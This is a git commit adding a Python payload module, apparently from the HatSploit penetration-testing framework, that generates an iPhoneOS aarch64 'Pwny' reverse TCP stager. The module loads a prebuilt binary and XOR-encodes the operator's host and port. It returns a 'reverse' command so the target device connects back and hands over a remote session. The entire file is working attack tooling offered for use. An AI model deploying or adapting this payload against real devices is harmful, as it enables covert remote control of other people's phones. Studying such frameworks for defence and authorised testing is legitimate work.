10362732fa3f8a58520e1a53325cfd5c8d699a20
Ivan Nikolsky <enty8080@gmail.com>
2021-06-12 11:23:55 +0200

    Create pwny_reverse_tcp.py

---
+++ payloads/iphoneos/aarch64/pwny_reverse_tcp.py
@@ -0,0 +1,77 @@
+#!/usr/bin/env python3
+
+#
+# MIT License
+#
+# Copyright (c) 2020-2021 EntySec
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+#
+
+from core.lib.payload import Payload
+from utils.string import StringTools
+from utils.tcp import TCPClient
+
+from data.pwny.iphoneos.session import HatSploitSession
+
+
+class HatSploitPayload(Payload, StringTools, TCPClient):
+    details = {
+        'Category': "stager",
+        'Name': "iPhoneOS aarch64 Pwny Reverse TCP",
+        'Payload': "iphoneos/aarch64/pwny_reverse_tcp",
+        'Authors': [
+            'Ivan Nikolsky (enty8080)'
+        ],
+        'Description': "Pwny reverse TCP payload for iPhoneOS aarch64.",
+        'Comments': [
+            ''
+        ],
+        'Architecture': "aarch64",
+        'Platform': "iphoneos",
+        'Risk': "high",
+        'Type': "reverse_tcp"
+    }
+
+    options = {
+        'LHOST': {
+            'Description': "Local host.",
+            'Value': TCPClient.get_local_host(),
+            'Type': "ip",
+            'Required': True
+        },
+        'LPORT': {
+            'Description': "Local port.",
+            'Value': 8888,
+            'Type': "port",
+            'Required': True
+        }
+    }
+
+    def run(self):
+        local_host, local_port = self.parse_options(self.options)
+
+        local_host = self.xor_string(local_host)
+        local_port = self.xor_string(local_port)
+
+        self.output_process("Generating payload...")
+        with open('data/pwny/iphoneos/aarch64/membrane', 'rb') as f:
+            payload = f.read()
+
+        return payload, f"reverse '{local_host}' '{local_port}'", HatSploitSession
